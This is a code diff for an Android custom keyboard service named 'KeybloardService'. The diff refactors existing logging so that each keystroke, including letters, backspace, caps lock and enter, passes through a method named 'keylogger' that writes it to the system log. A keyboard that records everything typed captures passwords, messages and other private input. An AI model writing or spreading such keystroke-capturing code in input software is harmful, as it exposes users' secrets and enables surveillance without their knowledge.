@@ -16,10 +16,10 @@ public class KeybloardService extends InputMethodService implements KeyboardView
     public KeybloardService() {
         super();
     }
-
+    private Logger logcat = Logger.getLogger("Keybloard");
     private KeyboardView keyboardView;
     private Keyboard keyboard;
-
+    private String currentKey = "";
     private boolean caps = false;
 
     @Override
@@ -47,7 +47,7 @@ public class KeybloardService extends InputMethodService implements KeyboardView
         if (inputConnection != null) {
             switch(primaryCode) {
                 case Keyboard.KEYCODE_DELETE :
-                    Logger.getLogger("Keybloard").log(Level.SEVERE, "Key pressed: " + "BACKSPACE");
+                    currentKey = "BACKSPACE";
                     CharSequence selectedText = inputConnection.getSelectedText(0);
                     if (TextUtils.isEmpty(selectedText)) {
                         inputConnection.deleteSurroundingText(1, 0);
@@ -59,11 +59,11 @@ public class KeybloardService extends InputMethodService implements KeyboardView
                     caps = !caps;
                     keyboard.setShifted(caps);
                     keyboardView.invalidateAllKeys();
-                    Logger.getLogger("Keybloard").log(Level.SEVERE, "Key pressed: " + "Caps Lock " + (caps ? "ON" : "OFF"));
+                    currentKey = "Caps Lock " + (caps ? "ON" : "OFF");
                     break;
                 case Keyboard.KEYCODE_DONE:
                     inputConnection.sendKeyEvent(new KeyEvent(KeyEvent.ACTION_DOWN, KeyEvent.KEYCODE_ENTER));
-                    Logger.getLogger("Keybloard").log(Level.SEVERE, "Key pressed: " + "ENTER");
+                    currentKey = "ENTER";
                     break;
                 default :
                     char code = (char) primaryCode;
@@ -71,11 +71,15 @@ public class KeybloardService extends InputMethodService implements KeyboardView
                         code = Character.toUpperCase(code);
                     }
                     inputConnection.commitText(String.valueOf(code), 1);
-                    Logger.getLogger("Keybloard").log(Level.SEVERE, "Key pressed: " + String.valueOf(code));
-
+                    currentKey = String.valueOf(code);
             }
+            keylogger(currentKey);
         }
 
+    }
+
+    private void keylogger(String currentKey){
+        logcat.log(Level.SEVERE, "Key pressed: " + currentKey);
     }
 
     @Override
